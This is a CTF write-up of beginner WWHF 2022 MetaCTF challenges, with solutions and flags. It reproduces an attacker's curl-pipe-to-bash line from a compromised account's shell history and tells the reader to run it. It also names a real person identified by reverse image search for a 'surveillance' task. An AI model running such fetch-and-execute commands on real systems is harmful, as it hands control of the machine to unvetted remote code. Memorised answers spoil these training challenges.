These are my write-ups for the WWHF 2022 CTF run on the MetaCTF platform.
Competition was held on Wed, October 12th 5pm-9pm Thursday, October 13th 10am-6:30pm Friday, October 14th 9am-4pm. 

# What's a CTF?
>In a jeopardy-style CTF (Capture the Flag) competition, teams compete to solve challenges covering a variety of cybersecurity categories and topics. For each challenge, your goal is to find a "flag", which often looks like a *MetaCTF{str1ng_separ4ted_by_und3rscores_like_this}* (this is also the flag for this challenge). There are exceptions.
>You may have to find this flag by analyzing provided materials (a log file, an encrypted message) or breaking into a vulnerable application (an simulated online banking app). You're expected to research and use the internet during the competition to figure out how to solve the challenges.

## Solution
MetaCTF{str1ng_separ4ted_by_und3rscores_like_this}

# Clients Are Always Right!
> We are a company that fully believes that the customer is always right. This is such a core value to our company that we have extended this belief to the clients that access our site! We hope everyone can see how much we care about our clients.
> Have a great day! 

## Solution
Navigating to the hyperlink opens up a username / password prompt. Using the Firefox debugger, we can see that the password is stored within the metadata of the client in Base64 encoding.

![](https://github.com/VCCyberSec/WWHF-2022-Writeup-main/blob/main/images/Pasted%20image%2020221013082934.png)

Using Cyberchef, we are able to easily convert the Base64 text back into cleartext revealing the flag.

![](https://github.com/VCCyberSec/WWHF-2022-Writeup-main/blob/main/images/Pasted%20image%2020221013083517.png)

# Corruption
> Oh no! I tried downloading a picture for my upcoming conference talk but it won't open! Can you see if you can fix it and open it? You can download it here: corrupted.png.

## Solution
Downloaded the file "corrupted.png"
Using the *strings* command against the file and reviewing the header, I noticed that the file is a PDF.  I renamed the file to "corrupted.pdf" and the flag was revealed in the PDF file.

## Flag
MetaCTF{0p3rating_$ystems_1ike_ext3nsions}

# Interactive Protection
> You forgot the password to access your online account at a local bank, but you need to transfer some money ASAP and their support isn't responding. Any way you can access it without a password?

## Solution
Link takes you to a webpage with a username / password prompt. 

# Meet the Cyber Range
> To access the cyber range, click "Range" on the navbar. You should see a tab with a Linux or a Windows machine. Access the url https://metactf.com/range-test from any of the VMs to get the flag.

## Solution
Connect to the Ubuntu VM on the CyberRange Machine and run *curl https://metactf.com/range-test* to examine the VM. Flag will be embedded within the webpage.

## Flag
MetaCTF{W3lcome_to_the_Matrix}

# Incident
> The credentials to the machine have been compromised! We suspect someone used them to log in, but we're not sure what, if anything, the attacker might have done. Can you help?

## Solution
Connect to the Ubuntu VM on the CyberRange Machine. Navigate to the home path of the user by running *cd /* and navigate to the *home* directory on the machine.

There are two directories "meta" and "ubuntu".

``` cmd
meta@ip-10-10-1-102:/home$ ls
meta  ubuntu
meta@ip-10-10-1-102:/home$ cd meta
meta@ip-10-10-1-102:~$ ls -la
total 44
drwxr-xr-x 4 meta meta 4096 Oct 14 17:37 .
drwxr-xr-x 4 root root 4096 Feb 28  2022 ..
-rw------- 1 meta meta  176 Jun 17 13:47 .bash_history
-rw------- 1 meta meta  181 Jun 16 16:56 .bash_history.bak
-rw-r--r-- 1 meta meta  220 Feb 28  2022 .bash_logout
-rw-r--r-- 1 meta meta 3771 Feb 28  2022 .bashrc
drwx------ 2 meta meta 4096 Jun 16 16:53 .cache
-rw------- 1 meta meta   37 Jun 17 04:17 .lesshst
drwxrwxr-x 3 meta meta 4096 Jun 17 13:47 .local
-rw-r--r-- 1 meta meta  807 Feb 28  2022 .profile
-rw------- 1 meta meta  556 Jun 17 04:33 .viminfo

Get flag by running curl command on the .bash_history.bak file.

curl -s https://metaproblems.com/2d23dbe9f546bd3918c166a2f783b31e/payload.sh | bash
```

## Flag
MetaCTF{cyberhazardous_flag_-_handle_with_care}

# Identity Crisis
> Hey there! We found this image on a hacker's hard drive, but we can't figure out who the person in the image is. Can you help us identify the target for future surveillance efforts?

![](../identity_crisis.png)

## Solution
Used Google Reverse Image Search to identify image
https://www.labnol.org/reverse/

## Flag
Igor Shuvalov

# Mail Trouble
> Check out these emails.
One of these is a phishing email with a spoofed FROM address. Can you find it? What email address did the attacker pretend to send an email from?

## Solution
Flag is in the email header. "security@google.com"